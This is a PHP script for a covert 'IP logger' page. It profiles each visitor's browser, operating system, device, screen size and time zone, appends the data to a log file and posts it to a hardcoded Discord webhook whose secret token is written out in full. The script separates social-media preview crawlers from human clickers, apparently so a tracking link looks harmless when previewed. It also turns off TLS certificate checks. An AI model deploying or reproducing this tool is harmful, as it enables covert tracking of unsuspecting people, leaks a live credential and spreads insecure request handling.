<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{
	if(isset($_POST['Width']) and isset($_POST['Height']) and isset($_POST['TimeZone']))
	{
        $data = "Screen:".$_POST['Width']."x".$_POST['Height']."\n".
                "TimeZone:".$_POST['TimeZone']."\n".
                "Date:".(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                                                          
	    
	    write($data);    
	}	
}

function write($data)
{
    File_Put_Contents("logs.txt", $data, FILE_APPEND);
}

function SendDiscordMesg($msg)
{
     $url = "https://discord.com/api/webhooks/826508309448228916/nJyT1DSh1N5iKNk4VxFx1oQ8vctqxZS2mMvjSBiSSPp626TEZusXDqPBU1TOlKXzTsNn";
     $headers = [ 'Content-Type: application/json; charset=utf-8' ];
     $POST = [ 'content' => $msg ];
     
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
     $response   = curl_exec($ch);
}

function LogData()
{ 
    echo "<script src=iplogger.js></script>";
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $data = 
	    "User Agent:".$user_agent."\n".
        "OS:".Operating_System($user_agent)."\n".
        "Browser:".Browser($user_agent)."\n".
        "Device:".Device($user_agent)."\n".
        "Bot:".((IsValidIP() and IsValidUserAgent()) == false ? "Yes" : "No")."\n";


    write($data);     
    SendDiscordMesg($data);	
}


function startsWith($haystack, $needle) 
{
     return substr($haystack, 0, strlen($needle)) === $needle;
}

function endsWith($haystack, $needle) 
{
    $length = strlen($needle);
    if(!$length) return true;
    return substr($haystack, -$length) === $needle;
}

function IsValidIP() 
{ 
    //https://github.com/CybrDev/IP-Logger Get_IP
    $ip = "unknown";
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) $ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) $ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) $ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) $ip = $_SERVER['REMOTE_ADDR'];     
	if($ip == "::1") return true; //localhost
	if (startsWith($ip, '2a03:2880:') and endsWith($ip, '::face:b00c')) return false; //facebook ipv6
	return filter_var($ip, FILTER_VALIDATE_IP); //https://stackoverflow.com/a/6211175/11390822
} 

function IsValidUserAgent() 
{
    if (empty($_SERVER['HTTP_USER_AGENT'])) return false;
    $User_Agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    //$b means list of bots user agents, Mostly these words came in bots user agent, So we don't allow them.
    $Bots = explode(" ","http:// https:// + .com twitterbot facebot googlebot tumblr linkedinbot snapchat slurp yahoo microsoft bingbot framework bot");
    //$h means list of human user agents, Mostly these words came in human user agent, So we allow only them.
    $Humans =  explode(" ","apple firefox windows android linux chrome safari gecko iphone macintosh mac khtml browser nokia opera mozilla mobile network blackberry cpu outlook pc");
    foreach ($Bots as $Bot) 
	{
		if (substr_count($User_Agent , $Bot) > 0)
		{
			logger("detected as bot at $Bot");
			return false;
		}
	}
    foreach ($Humans as $Human) 
	{
		if (substr_count($User_Agent,$Human) > 0) 
		{
			logger("detected as human at $Human");
			return true;
		}
	}
    	 
}
function logger($log)
{
	echo "<script>console.log('$log');</script>";
}
function Operating_System($user_agent) 
{
    $Operating_Systems = array(
    	'/windows nt 10/i'     	=>  'Windows 10',
    	'/windows nt 6.3/i'     =>  'Windows 8.1',
    	'/windows nt 6.2/i'     =>  'Windows 8',
    	'/windows nt 6.1/i'     =>  'Windows 7',
    	'/windows nt 6.0/i'     =>  'Windows Vista',
    	'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
    	'/windows nt 5.1/i'     =>  'Windows XP',
    	'/windows xp/i'         =>  'Windows XP',
    	'/windows nt 5.0/i'     =>  'Windows 2000',
    	'/windows me/i'         =>  'Windows ME',
    	'/win98/i'              =>  'Windows 98',
    	'/win95/i'              =>  'Windows 95',
    	'/win16/i'              =>  'Windows 3.11',
    	'/macintosh|mac os x/i' =>  'Mac OS X',
    	'/mac_powerpc/i'        =>  'Mac OS 9',
    	'/linux/i'              =>  'Linux',
    	'/ubuntu/i'             =>  'Ubuntu',
    	'/iphone/i'             =>  'iPhone',
    	'/ipod/i'               =>  'iPod',
    	'/ipad/i'               =>  'iPad',
    	'/android/i'            =>  'Android',
    	'/blackberry/i'         =>  'BlackBerry',
    	'/webos/i'              =>  'Mobile'
    );
    foreach ($Operating_Systems as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            return $value;
        }
    }
    return "Unknown OS";
}


function Browser($user_agent) 
{
	$browsers = array(
		'/msie/i'       =>  'Internet Explorer',
		'/Trident/i'    =>  'Internet Explorer',
		'/firefox/i'    =>  'Firefox',
		'/safari/i'     =>  'Safari',
		'/chrome/i'     =>  'Chrome',
		'/edge/i'       =>  'Edge',
		'/opera/i'      =>  'Opera',
		'/netscape/i'   =>  'Netscape',
		'/maxthon/i'    =>  'Maxthon',
		'/konqueror/i'  =>  'Konqueror',
		'/ubrowser/i'   =>  'UC Browser',
		'/mobile/i'     =>  'Handheld Browser'
	);
	foreach ($browsers as $regex => $value) 
	{
		if (preg_match($regex, $user_agent))
		{ 
	        return $value;
		}
	}
	return "Unknown Browser";
}

function Device($user_agent)
{
	$tablet_browser = 0;
	$mobile_browser = 0;

	if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) $tablet_browser++;
	if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) $mobile_browser++;
	if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) $mobile_browser++;
	$mobile_ua = strtolower(substr($user_agent, 0, 4));
	$mobile_agents = array(
		'w3c ','acs-','alav','alca','amoi','audi','avan','benq','bird','blac',
		'blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno',
		'ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-',
		'maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-',
		'newt','noki','palm','pana','pant','phil','play','port','prox','shar',
		'qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','tim-',
		'sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','wapp',
		'tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','xda-',
		'wapr','webc','winw','winw','xda');

	if (in_array($mobile_ua,$mobile_agents)) $mobile_browser++;
	if (strpos(strtolower($user_agent),'opera mini') > 0) 
	{
		$mobile_browser++;
		$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
		if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) $tablet_browser++;
	}
	if ($tablet_browser > 0) return 'Tablet';
	else if ($mobile_browser > 0) return 'Mobile';
	else return 'Computer';
}

?>